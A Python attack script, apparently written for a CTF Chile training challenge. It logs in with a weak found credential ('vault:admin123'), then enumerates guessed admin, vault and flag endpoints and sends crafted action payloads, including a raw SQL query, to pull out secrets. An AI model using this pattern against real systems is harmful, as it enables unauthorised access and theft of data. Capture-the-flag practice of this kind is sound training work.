#!/usr/bin/env python3
"""
CTF Chile - BÚSQUEDA DE FLAG CON SESIÓN AUTENTICADA
vault:admin123 funcionó - ahora explorar con sesión válida
"""
import requests
import json

TARGET = "http://training-pod2.ctfchile.com:32778"

print("🔓 BÚSQUEDA CON SESIÓN AUTENTICADA vault:admin123")
print("=" * 60)

# Primero autenticarse
print("[1] Autenticándose...")
try:
    auth_response = requests.post(f"{TARGET}/api/login",
                                 headers={"Content-Type": "application/json"},
                                 json={"username": "vault", "password": "admin123"},
                                 timeout=10)

    print(f"   Login: {auth_response.status_code}")
    print(f"   Respuesta: {auth_response.text}")

    # Extraer cookies de sesión si las hay
    session_cookies = auth_response.cookies
    print(f"   Cookies: {dict(session_cookies)}")

except Exception as e:
    print(f"   Error login: {e}")
    exit(1)

# Ahora usar la sesión autenticada para explorar
print(f"\n[2] Explorando con sesión autenticada...")

# Crear sesión con cookies
session = requests.Session()
session.cookies.update(session_cookies)

# Headers con autenticación
auth_headers = {
    "Content-Type": "application/json",
    "Cookie": "; ".join([f"{k}={v}" for k, v in session_cookies.items()])
}

# Endpoints a explorar con sesión autenticada
protected_endpoints = [
    # Endpoints de vault
    "/api/vault",
    "/api/vault/list",
    "/api/vault/secrets",
    "/api/vault/config",
    "/api/vault/status",
    "/vault",
    "/vault/secrets",
    "/vault/list",
    "/vault/config",

    # Endpoints de admin
    "/api/admin",
    "/api/admin/config",
    "/api/admin/secrets",
    "/api/admin/users",
    "/admin",
    "/admin/config",
    "/admin/vault",
    "/admin/secrets",

    # Endpoints de flag
    "/api/flag",
    "/api/flags",
    "/flag",
    "/flags",
    "/secret",
    "/secrets",

    # Otros endpoints
    "/api/user/profile",
    "/api/system/config",
    "/api/status",
    "/status",
    "/config",
    "/profile"
]

flags_found = []

for endpoint in protected_endpoints:
    try:
        # GET request con sesión
        r_get = session.get(f"{TARGET}{endpoint}", headers=auth_headers, timeout=5)

        print(f"   GET {endpoint}: {r_get.status_code}")
        if r_get.status_code == 200 and len(r_get.text) > 10:
            print(f"      Respuesta: {r_get.text[:150]}...")

            # Buscar flags
            if "ctf{" in r_get.text.lower() or "flag{" in r_get.text.lower() or "chile{" in r_get.text.lower():
                print(f"   🏆 FLAG ENCONTRADA EN GET {endpoint}:")
                print(f"   {r_get.text}")
                flags_found.append(f"GET {endpoint}: {r_get.text}")

        # POST request con sesión
        r_post = session.post(f"{TARGET}{endpoint}",
                             headers=auth_headers,
                             json={"action": "list", "user": "vault"},
                             timeout=5)

        if r_post.status_code != r_get.status_code or len(r_post.text) != len(r_get.text):
            print(f"   POST {endpoint}: {r_post.status_code}")
            if r_post.status_code == 200 and len(r_post.text) > 10:
                print(f"       Respuesta: {r_post.text[:150]}...")

                # Buscar flags
                if "ctf{" in r_post.text.lower() or "flag{" in r_post.text.lower() or "chile{" in r_post.text.lower():
                    print(f"   🏆 FLAG ENCONTRADA EN POST {endpoint}:")
                    print(f"   {r_post.text}")
                    flags_found.append(f"POST {endpoint}: {r_post.text}")

    except Exception as e:
        pass

print(f"\n[3] Probando acciones específicas de vault...")

# Acciones específicas de vault con autenticación
vault_actions = [
    {"action": "list"},
    {"action": "get", "key": "flag"},
    {"action": "get", "key": "secret"},
    {"action": "status"},
    {"action": "config"},
    {"command": "list"},
    {"command": "get_flags"},
    {"command": "show_secrets"},
    {"operation": "read", "target": "flags"},
    {"request": "flags", "user": "vault"},
    {"query": "SELECT * FROM flags"},
    {"type": "flag", "operation": "read"}
]

for action in vault_actions:
    try:
        r = session.post(f"{TARGET}/api/vault",
                        headers=auth_headers,
                        json=action,
                        timeout=5)

        if r.status_code == 200 and len(r.text) > 10:
            print(f"   Acción {action}: {r.text[:100]}...")
            if "ctf{" in r.text.lower() or "flag{" in r.text.lower():
                print(f"   🏆 FLAG CON ACCIÓN {action}:")
                print(f"   {r.text}")
                flags_found.append(f"Acción {action}: {r.text}")

    except:
        pass

print(f"\n" + "="*60)
if flags_found:
    print("🏆 FLAGS ENCONTRADAS:")
    for flag in flags_found:
        print(f"   {flag}")
else:
    print("❌ No se encontraron flags con sesión autenticada")
    print("💡 La flag podría estar en:")
    print("   • Webhooks anteriores")
    print("   • Endpoints que requieren clave digital específica")
    print("   • Archivos del sistema (requiere SSH)")

print("="*60)